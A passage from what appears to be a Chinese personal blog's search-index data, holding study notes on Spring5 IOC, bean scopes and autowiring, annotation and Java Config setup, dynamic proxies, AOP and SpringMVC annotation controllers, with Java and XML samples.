4.视图解析器就能获取到这个对象，还有转发过来的文件名，与前缀、后缀一起拼接，然后访问到对应目录下的JSP文件。 5.JSP从对象中取出数据展示。 注解开发1.新建模块04-Annotation，目录结构如下： 注意需要右键添加框架支持，项目结构中新建lib目录将库文件全都添加进来。 2.在pom.xml中先配置好build标签，防止出错 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;false&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;false&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;resources&gt;&lt;&#x2F;build&gt; 3.同样在web.xml中配置DispatcherServlet。 1234567891011121314151617181920&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot; version&#x3D;&quot;4.0&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt; &lt;&#x2F;servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt; &lt;&#x2F;servlet-mapping&gt;&lt;&#x2F;web-app&gt; 4.在springmvc-servlet.xml中，这次不用bean对象来配置处理器和适配器了，而是使用注解开发，因此需要默认的Servlet处理器，开启注解驱动，扫描某个包的注解 123&lt;context:component-scan base-package&#x3D;&quot;com.ggy.controller&quot;&#x2F;&gt;&lt;mvc:default-servlet-handler&#x2F;&gt;&lt;mvc:annotation-driven&#x2F;&gt; 然后配置视图解析器 1234&lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; id&#x3D;&quot;internalResourceViewResolver&quot;&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 5.Controller类中 123456789@org.springframework.stereotype.Controllerpublic class Controller &#123; @RequestMapping(&quot;&#x2F;hello&quot;) public String sayHello(Model model)&#123; model.addAttribute(&quot;msg&quot;, &quot;hello,ggy111&quot;); return &quot;hello&quot;; &#125;&#125; 使用@Controller（这里包名都显示出来了），注明这是一个控制器。类里面可以有许多方法，每一个方法可以使用@RequestMapping来配置成一个Servlet，处理业务逻辑。即访问/hello就可以进入这个sayHello中处理。有一个参数Model，调用addAttribute可以添加键值对对象，返回”hello”，这个就是JSP的文件名，之后会与视图解析器一起拼接。 6.运行Tomcat即可。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"SpringMVC学习(1)","slug":"SpringMVC学习-1","permalink":"https://ggyggy666.github.io/tags/SpringMVC%E5%AD%A6%E4%B9%A0-1/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Spring5学习(3)","slug":"Spring5学习-3","date":"2021-07-01T11:29:41.000Z","updated":"2021-07-06T08:52:06.401Z","comments":true,"path":"2021/07/01/Spring5学习-3/","link":"","permalink":"https://ggyggy666.github.io/2021/07/01/Spring5%E5%AD%A6%E4%B9%A0-3/","excerpt":"今天继续学习Spring5。","text":"今天继续学习Spring5。 代理模式静态代理类似租房一样，有客户、中介和房东，中介起到的就是代理作用。 角色分析： 抽象角色：一般会使用接口或者抽象类。 真实角色：被代理的角色。 代理角色：代理真实角色，还可以有额外的操作。 客户：访问代理角色 好处： 可以使真实角色的操作更加纯粹。 公共业务交给代理角色，实现业务的分工。 公共业务发生扩展的时候方便集中管理。 缺点： 一个角色会产生一个代理角色，代码翻倍，效率低。 真实角色 123public class Host&#123; xxx&#125; 代理角色 123456public class Proxy&#123; private Host host; 生成host的Setter方法 可以生成代理方法，内容是使用host对象调用Host类中的方法 可以有代理自己的其它方法&#125; 客户 123456main函数中&#123; Host host &#x3D; new Host(); &#x2F;&#x2F;new真实角色 Proxy proxy &#x3D; new Proxy(); &#x2F;&#x2F;new代理角色 proxy.Setter方法（host) &#x2F;&#x2F;传真实角色进去 proxy.代理方法&#125; 说白了就是在原来的类上套一层类。 动态代理角色与静态代理一样。 给真实角色生成一个动态代理，利用的是Java的反射机制。 1.新建项目06-Proxy，项目结构如下 2.实现抽象角色Rent接口 12345package com.ggy.demo;public interface Rent &#123; void rent();&#125; 3.实现真实角色Host类 1234567package com.ggy.demo;public class Host implements Rent&#123; public void rent() &#123; System.out.println(&quot;我是房东，我要出租房子&quot;); &#125;&#125; 4.实现代理处理程序 1234567891011121314151617181920212223package com.ggy.demo;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123; private Object target; public void setTarget(Object target) &#123; this.target = target; &#125; public Object getProxy()&#123; return Proxy.newProxyInstance(this.getClass().getClassLoader(), target.getClass().getInterfaces(), this); &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object invoke = method.invoke(target, args); return invoke; &#125;&#125; 这里使用到两个类InvocationHandler和Proxy。Proxy负责返回代理角色，InvocationHandler负责利用反射机制调用代理角色中的方法。setTarget就是设置要代理的真实角色，getProxy返回代理角色，invoke中method调用invoke方法来执行target真实角色中的方法。 5.客户 12345678910111213import com.ggy.demo.Host;import com.ggy.demo.ProxyInvocationHandler;import com.ggy.demo.Rent;public class test &#123; public static void main(String[] args) &#123; Host host &#x3D; new Host(); ProxyInvocationHandler pih &#x3D; new ProxyInvocationHandler(); pih.setTarget(host); Rent proxy &#x3D; (Rent) pih.getProxy(); proxy.rent(); &#125;&#125; 首先生成真实角色host 然后实例化ProxyInvocationHandler代理处理程序 通过调用setTarget方法来设置要代理的真实角色 getProxy方法返回代理角色，注意这个代理角色的类型必须是虚拟角色即接口Rent类 代理角色调用真实角色中的方法 AOP基本概念 所谓AOP就是面向切面编程，有一个业务的基础上，想要增加其它业务，比如在这个业务的前后都增加一些功能，那么就可以使用AOP切入这个业务，然后在其前后调用功能相对的类即可。 比如add业务，需要在其前后都添加多一些功能。先前就是使用动态代理，再add类的继承上再套一层类，但是如果是使用AOP的话，就是切入add这个业务，然后在其前后添加。 在Spring中的作用提供声明式事务，允许用户自定义切面。 横切关注点：跨越应用程序多个模块的方法或功能。与我们业务逻辑无关的但是需要我们关注的部分。如日志、安全、缓存和事务等。 切面（ASPECT）：横切关注点被模块化的特殊对象即类。 通知（Advice）：切面必须要完成的工作，即切面类中的方法。 目标（Target）：被通知对象。 代理（Proxy）：向目标对象应用通知之后创建的对象。 切入点（Point Cut）：切面通知执行的“地点”的定义。 连接点（Join Point）：与切入点匹配的执行点。 实现方法一使用了Spring的接口 1.新建一个模块，目录结构如下： 在pom.xml中增加对AOP支持的依赖 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt; &lt;version&gt;1.9.7&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 2.填写接口类userService和实现类userServiceImpl 12345678package com.ggy.service;public interface userService &#123; public void add(); public void delete(); public void alter(); public void select();&#125; 12345678910111213141516171819package com.ggy.service;public class userServiceImpl implements userService &#123; public void add() &#123; System.out.println(&quot;add...&quot;); &#125; public void delete() &#123; System.out.println(&quot;delete...&quot;); &#125; public void alter() &#123; System.out.println(&quot;alter...&quot;); &#125; public void select() &#123; System.out.println(&quot;select...&quot;); &#125;&#125; 3.需要使用AOP去切入这个实现类的每一个方法，在方法前后输出一些日志信息，因此先生成Log类 log 1234567891011package com.ggy.log;import org.springframework.aop.MethodBeforeAdvice;import java.lang.reflect.Method;public class Log implements MethodBeforeAdvice &#123; public void before(Method method, Object[] objects, Object o) throws Throwable &#123; System.out.println(o.getClass().getName()+&quot;类的&quot;+method.getName()+&quot;方法被调用了。&quot;); &#125;&#125; 需要实现aop包中的MethodBeforeAdvice类的before，代表着在切入面之前调用该函数。method就是切入点的类的方法，Object o就是切入点的类。 afterLog 1234567891011package com.ggy.log;import org.springframework.aop.AfterReturningAdvice;import java.lang.reflect.Method;public class afterLog implements AfterReturningAdvice &#123; public void afterReturning(Object o, Method method, Object[] objects, Object o1) throws Throwable &#123; System.out.println(&quot;执行的方法是：&quot;+method.getName()+&quot;，返回结果是：&quot;+o+&quot;, &quot;+o1.getClass().getName()); &#125;&#125; 同理，在切入点的类的函数调用完成返回之后再调用afterReturning, Object o应该是返回的类，o1才是切入点的类 4.配置applicationContext.xml 1234567891011121314151617&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop.xsd&quot;&gt; &lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;com.ggy.service.userServiceImpl&quot;&#x2F;&gt; &lt;bean id&#x3D;&quot;log&quot; class&#x3D;&quot;com.ggy.log.Log&quot;&#x2F;&gt; &lt;bean id&#x3D;&quot;afterLog&quot; class&#x3D;&quot;com.ggy.log.afterLog&quot;&#x2F;&gt; &lt;aop:config&gt; &lt;aop:pointcut id&#x3D;&quot;pointcut&quot; expression&#x3D;&quot;execution(* com.ggy.service.userServiceImpl.*(..));&quot;&#x2F;&gt; &lt;aop:advisor advice-ref&#x3D;&quot;log&quot; pointcut-ref&#x3D;&quot;pointcut&quot;&#x2F;&gt; &lt;aop:advisor advice-ref&#x3D;&quot;afterLog&quot; pointcut-ref&#x3D;&quot;pointcut&quot;&#x2F;&gt; &lt;&#x2F;aop:config&gt;&lt;&#x2F;beans&gt; 首先注册三个bean对象，然后配置aop。aop:pointcut就是切入点，expression中的是表达式，第一个*是返回所有类型，第二个则代表匹配到userServiceImpl类中的所有函数，(..)表示参数的抽象化。之后使用aop:advisor，advice-ref就是要执行的那个bean对象，pointcut-ref就是切入点。 5.编写测试类 1234567public class Mytest &#123; public static void main(String[] args) &#123; ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); userService userservice &#x3D; (userService) context.getBean(&quot;userService&quot;); userservice.add(); &#125;&#125; 输出结果： 123com.ggy.service.userServiceImpl类的add方法被调用了。add...执行的方法是：add，返回结果是：null, com.ggy.service.userServiceImpl 成功插入。 实现方法二一是使用了Spring的接口，每个方法就有一个实现接口类，before和after这种。二则是使用自定义的类。 1.新增一个addLog类 12345678910package com.ggy.log;public class addLog &#123; public void before()&#123; System.out.println(&quot;before...&quot;); &#125; public void after()&#123; System.out.println(&quot;after...&quot;); &#125;&#125; 两个方法都在同一个类里了。 2.配置applicationContext.xml 12&lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;com.ggy.service.userServiceImpl&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;addLog&quot; class&#x3D;&quot;com.ggy.log.addLog&quot;&#x2F;&gt; 1234567&lt;aop:config&gt; &lt;aop:aspect ref&#x3D;&quot;addLog&quot;&gt; &lt;aop:pointcut id&#x3D;&quot;pointcut&quot; expression&#x3D;&quot;execution(* com.ggy.service.userServiceImpl.*(..));&quot;&#x2F;&gt; &lt;aop:before method&#x3D;&quot;before&quot; pointcut-ref&#x3D;&quot;pointcut&quot;&#x2F;&gt; &lt;aop:after method&#x3D;&quot;after&quot; pointcut-ref&#x3D;&quot;pointcut&quot;&#x2F;&gt; &lt;&#x2F;aop:aspect&gt;&lt;&#x2F;aop:config&gt; 当然还是要先注册好用到的bean对象，然后在aop:config中使用aop:aspect切面，ref就是要连接到增加的业务的类addLog。然后还是aop:pointcut切入点，之后使用aop:before，方法是addLog类中的before名称；再使用aop:after即可。 测试结果： 123before...add...after... 但是这种方式只能执行自己定义的方法，可操作性不强，没有方法一那么多功能可以获取执行的类和方法名，获取返回值等。 实现方法三使用注解方式。 1.直接在addLog上增加注解 1234567891011@Aspectpublic class addLog &#123; @Before(&quot;execution(* com.ggy.service.userServiceImpl.*(..));&quot;) public void before()&#123; System.out.println(&quot;before...&quot;); &#125; @After(&quot;execution(* com.ggy.service.userServiceImpl.*(..));&quot;) public void after()&#123; System.out.println(&quot;after...&quot;); &#125;&#125; 使用@Aspect表明这是一个切面类，@Before是切入点之前执行，execution(* com.ggy.service.userServiceImpl.*(..));则是匹配切入点。 2.在applicationContext.xml中 123&lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;com.ggy.service.userServiceImpl&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;addLog&quot; class&#x3D;&quot;com.ggy.log.addLog&quot;&#x2F;&gt;&lt;aop:aspectj-autoproxy proxy-target-class&#x3D;&quot;false&quot;&#x2F;&gt; 只需要注入切面类为bean对象，然后开启aop的注解支持即可。proxy-target-class=”false”可以不要的，表示使用JDK方式进行代理，如果为true就是使用cglib代理，二者效果一样的。 测试结果： 123before...add...after... 3.在addLog类中增加一个around方法 123456@Around(&quot;execution(* com.ggy.service.userServiceImpl.*(..));&quot;)public void around(ProceedingJoinPoint jp) throws Throwable &#123; System.out.println(&quot;环绕前&quot;); Object proceed &#x3D; jp.proceed(); System.out.println(&quot;环绕后&quot;);&#125; 使用@Around注解，该方法有参数ProceedingJoinPoint jp，jp.proceed表示执行切面类的方法。 测试结果： 12345环绕前before...add...环绕后after... 先是环绕前，然后proceed执行，before接着是add，而after是等到返回时才执行的，因此先输出了环绕后。 jp对象还有其它的一些方法，比如获取签名即调用的切入点的函数 1System.out.println(jp.getSignature()); 结果： 1void com.ggy.service.userService.add()","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Spring5学习(3)","slug":"Spring5学习-3","permalink":"https://ggyggy666.github.io/tags/Spring5%E5%AD%A6%E4%B9%A0-3/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Spring5学习(2)","slug":"Spring5学习-2","date":"2021-06-30T14:16:28.000Z","updated":"2021-07-01T03:45:40.968Z","comments":true,"path":"2021/06/30/Spring5学习-2/","link":"","permalink":"https://ggyggy666.github.io/2021/06/30/Spring5%E5%AD%A6%E4%B9%A0-2/","excerpt":"今天继续学习Spring。","text":"今天继续学习Spring。 Bean的作用域 singleton单例模式（Spring默认），不管使用getBean获取多少个相同的对象，返回来的对象始终都只指向一个而已，适用于单线程。 beans.xml中 1&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot; p:name&#x3D;&quot;ggy&quot; p:address-ref&#x3D;&quot;address&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt; 测试类中 12Student name &#x3D; (Student) context.getBean(&quot;student&quot;);Student name1 &#x3D; (Student) context.getBean(&quot;student&quot;); name和name1对象是同一个对象。 prototype多例模式，获取相同的对象返回来的对象是不同的，适用于多线程。 beans.xml中 1&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot; p:name&#x3D;&quot;ggy&quot; p:address-ref&#x3D;&quot;address&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt; 测试类中，name和name1对象是两个不同的对象。 其它模式，request、session等用于web中。 Bean的自动装配之前bean标签中，需要用property属性来为类的属性赋值，而如果属性是其它类即使用ref时，可以使用自动装配来寻找到对应的其它类。 使用autowire通过byName自动装配需要保证所有bean的id唯一，并且这个bean需要和注入的类的属性对应的set方法后面的值一致，即某个类中的属性cat对应的set方法setCat，id就需要是cat。 123456&lt;bean id&#x3D;&quot;cat&quot; class&#x3D;&quot;com.ggy.pojo.cat&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;dog&quot; class&#x3D;&quot;com.ggy.pojo.dog&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;pepole&quot; class&#x3D;&quot;com.ggy.pojo.People&quot; autowire&#x3D;&quot;byName&quot;&gt; &lt;property name&#x3D;&quot;name&quot; value&#x3D;&quot;ggy&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 通过使用autowire=”byName”，就能通过id=”cat”和id=”dog”去自动装配那两个类。 使用byType自动装配需要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致。 123456&lt;bean class&#x3D;&quot;com.ggy.pojo.cat&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;com.ggy.pojo.dog&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;pepole&quot; class&#x3D;&quot;com.ggy.pojo.People&quot; autowire&#x3D;&quot;byType&quot;&gt; &lt;property name&#x3D;&quot;name&quot; value&#x3D;&quot;ggy&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; cat和dog可以没有id，通过class就能找到对应的类。 使用注解JDK1.5，Spring2.5之后启用，Spring4之后要使用必须保证aop包导入了，不过Spring-webmvc那个maven依赖存在这个包。 首先需要导入一些xml的约束（context）和配置： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;context:annotation-config/&gt; &lt;bean id=\"cat\" class=\"com.ggy.pojo.cat\"/&gt; &lt;bean id=\"dog\" class=\"com.ggy.pojo.dog\"/&gt; &lt;bean id=\"pepole\" class=\"com.ggy.pojo.pepole\"/&gt;&lt;/beans&gt; bean对象只需要定义即可，之后在相应的class类中使用注解。 通过@Autowired直接在类中的属性定义的上一行使用，也可以在属性的Setter方法上使用。使用@Autowired且bean对象在IOC容器中时就可以不写Setter方法了。 12345@Autowiredprivate String name;@Nullable //在字段前使用，说明这个字段可以为空。@Autowired(required=false)，默认是true的，为false之后这个自动装配的类对象可以为空了。 @Autowired是通过byType方式来自动装配的，所以id与类对象名不一样也是可以找到的，但是如果有两个bean对象的class都一样，那么没办法定位是哪一个，此时需要使用@Qualifier(value=”xxx”)，使用id名字来定位。 12345public class People&#123; @Autowired @Qualifier(value=\"xxx\") private Cat cat;&#125; 通过@Resource先通过byName, 如果名字找不到，再通过byType方式来自动装配。 1234567bean对象唯一，直接使用@Resourceprivate Cat cat;bean对象不唯一@Resource(name&#x3D;&quot;xxx&quot;)private Cat cat; 注解开发上面的注解中，beans.xml中还是需要创建bean标签来创建对象，可以去掉。 1.新建一个项目04-Annotation，项目结构如下 2.创建User类 12345678package com.ggy.pojo;import org.springframework.stereotype.Component;@Componentpublic class User &#123; public String name&#x3D;&quot;ggy&quot;;&#125; 这里使用了注解@Component（组件）方式 3.新建applicationContext.xml 1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd&quot;&gt; &lt;context:annotation-config&#x2F;&gt; &lt;!--注意下面这句，扫描组件--&gt; &lt;context:component-scan base-package&#x3D;&quot;com.ggy.pojo&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 通过context:component-scan来扫描包下的注解，这样就能找到pojo包下的User类，从而不需要再去使用bean标签创建对象了。 3.创建测试类 1234567public class Mytest &#123; public static void main(String[] args) &#123; ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); User user &#x3D; (User) context.getBean(&quot;user&quot;); System.out.println(user.name); &#125;&#125; 由于没有bean标签了，也就没有id，那么获取bean对象名就是类小写名字即user。 4.上面User类中属性值已经被写固定了，要注入的话需要 12345@Componentpublic class User &#123; @Value(&quot;ggy&quot;) public String name;&#125; 这种注解适合简单的属性值注入，如果是Map，List这些复杂类型，还是使用XML更清楚。 5.衍生注解 @Component还有其它三个衍生注解，在web层中，按照MVC三层架构来标识。 dao 【@Repository】 service【@Service】 controller【@Controller】 这几个类都是一样的，都是将某个类作为组件注册到Spring中装配Bean。注意这时候component-scan扫的包就得是 1&lt;context:component-scan base-package=\"com.ggy\"/&gt; 6.作用域注解 123456@Component@Scope(\"singleton\") //或者@Scope(\"prototype\")等public class User &#123; @Value(\"ggy\") public String name;&#125; 7.XML与注解 XML更加万能，适用于任何场合，维护简单方便。 注解只能使用在自己那个类，维护相对复杂。 最佳实践： XML用来创建管理bean对象，还是使用bean标签。 注解用来注入属性值，@Value这些，注意要使用注解必须开启注解支持。 Java Config注解开发不使用XML文件，直接使用Java类来config。 1.创建新项目05-JavaConfig 2.创建User类 123456789101112131415161718192021package com.ggy.pojo;import org.springframework.beans.factory.annotation.Value;import org.springframework.stereotype.Component;@Componentpublic class User &#123; @Value(&quot;ggy&quot;) private String name; public String getName() &#123; return name; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; + &#39;&#125;&#39;; &#125;&#125; 还是一样使用@Component，将User类交给Spring管理，@Value注入属性值。 3.创建JavaConfig类 123456789@Configuration@ComponentScan(&quot;com.ggy.pojo&quot;)@Import(JavaConfig1.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125;&#125; 这里开头就是@Configuration表示配置类，取代XML，一样有@ComponentScan扫描包，@Import是导入其它的配置文件与这个文件合成一个，我另外创建了一个JavaConfig1类 123@Componentpublic class JavaConfig1 &#123;&#125; 之前XML创建bean对象是使用bean标签，现在则是使用@Bean然后创建一个方法，方法名就是对象名user，返回一个新建的User类对象即可。 4.创建测试类 1234567public class test &#123; public static void main(String[] args) &#123; ApplicationContext context &#x3D; new AnnotationConfigApplicationContext(JavaConfig.class); User user &#x3D; (User) context.getBean(&quot;user&quot;); System.out.println(user.toString()); &#125;&#125; 使用的是AnnotationConfigApplicationContext方法，读取JavaConfig.class类。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Spring5学习(2)","slug":"Spring5学习-2","permalink":"https://ggyggy666.github.io/tags/Spring5%E5%AD%A6%E4%B9%A0-2/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Spring5学习(1)","slug":"Spring5学习-1","date":"2021-06-30T03:01:20.000Z","updated":"2021-06-30T12:26:37.261Z","comments":true,"path":"2021/06/30/Spring5学习-1/","link":"","permalink":"https://ggyggy666.github.io/2021/06/30/Spring5%E5%AD%A6%E4%B9%A0-1/","excerpt":"考试基本考完了，现在来学习一下spring框架。","text":"考试基本考完了，现在来学习一下spring框架。 Spring简介Spring是一个轻量级的免费的控制反转（IOC）和面向切面编程（AOP）的框架。整合了其它技术，前身是Interface21框架。 官网：https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#spring-core GitHub：https://github.com/spring-projects/spring-framework maven依赖 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;sprintg-webmvc&lt;&#x2F;artifactId&gt; &lt;version&gt;5.3.8.RELEASE&lt;&#x2F;version&gt;&lt;dependency&gt;&#x2F;&#x2F;spring跟mybatis整合还需要&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;sprintg-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;5.3.8.RELEASE&lt;&#x2F;version&gt;&lt;dependency&gt; Spring的七大模块 来源：https://blog.csdn.net/qq_33082731/article/details/75066956 学习路程：Spring-&gt;SpringMVC-&gt;SpringBoot-&gt;SpringCloud 弊端主要是配置太多。 IOC控制反转原理：IOC是一种设计思想，在传统的思想中，创建一个接口和实现类即Dao层，用来访问数据库；然后创建一个业务层，它会new一个Dao层的实现类来调用，这样就写死了要调用的那个Dao层的实现类。如果Dao层中新增其它操作数据库的实现类，那么每次都要修改业务层中new的类，这种情况下非常麻烦，此时控制权在程序员手里，必须依靠他们来修改代码。而IOC控制反转就是为了将控制权从程序员手中移到用户手中。程序员可以公开一个接口用来设置要使用的Dao层中的实现类，这样用户想要调用哪种功能，就可以通过这个接口来传入类名来设定，控制权就转到了用户手中。程序员只需专注于业务的开发即可。 1.新建一个Maven-Project，先将Spring的Maven依赖导入到pom.xml中。 2.在项目下新建一个模块01-IOC，新建包和类，项目结构如下： 3.在userDao中定义接口，userDaoImpl实现接口 12345678910111213141516&#x2F;&#x2F;userDaopackage com.ggy.Dao;public interface userDao &#123; void getUser();&#125;&#x2F;&#x2F;userDaoImplpackage com.ggy.Dao;public class userDaoImpl implements userDao &#123; public void getUser() &#123; System.out.println(&quot;ggy1&quot;); &#125;&#125; 4.在userService中定义接口，userServiceImpl实现 1234567891011121314151617package com.ggy.Service;public interface userService &#123; void getUser();&#125;package com.ggy.Service;import com.ggy.Dao.userDao;import com.ggy.Dao.userDaoImpl;public class userServiceImpl implements userService &#123; public void getUser() &#123; userDao userDao &#x3D; new userDaoImpl(); userDao.getUser(); &#125;&#125; 14行中，这个类new一个userDaoImpl类，然后调用getUser方法。 5.在test测试类中 12345678import com.ggy.Service.userServiceImpl;public class test &#123; public static void main(String[] args) &#123; userServiceImpl userService &#x3D; new userServiceImpl(); userService.getUser(); &#125;&#125; 创建userServiceImpl实例并调用getUser。运行可以得到ggy1。 上述就是传统的调用方式，如果Dao层中新增一个功能类ggyDaoImpl 1234567package com.ggy.Dao;public class ggyDaoImpl implements userDao &#123; public void getUser() &#123; System.out.println(&quot;ggy2&quot;); &#125;&#125; 那么测试类调用的不变，但是userServiceImpl中创建的userDaoImpl对象就需要更改成new ggyDaoImpl()，控制权在程序员手中。而如果userServiceImpl中提供接口设置调用的Dao层对象时 1234567891011public class userServiceImpl implements userService &#123; private userDao userDao1; public void getUser() &#123; userDao userDao &#x3D; userDao1; userDao.getUser(); &#125; public void setDao(userDao userDao)&#123; this.userDao1 &#x3D; userDao; &#125;&#125; 然后在test类中 12345678public class test &#123; public static void main(String[] args) &#123; userServiceImpl userService &#x3D; new userServiceImpl(); userService.setDao(new ggyDaoImpl()); userService.getUser(); &#125;&#125; 调用了一个setDao方法，new一个ggyDaoImpl对象传值即可调用，需要调用其它类时只需要new的对象不一样即可。这样控制权就在用户手里，用户想调用什么就new什么。如此耦合性就大大降低。 HelloSpring1.新建一个模块02-HelloSpring，目录如下 2.新建一个Hello类，里面定义一个变量，并且设置Setter and Getter和toString方法。 1234567891011121314151617181920package com.ggy.pojo;public class Hello &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String 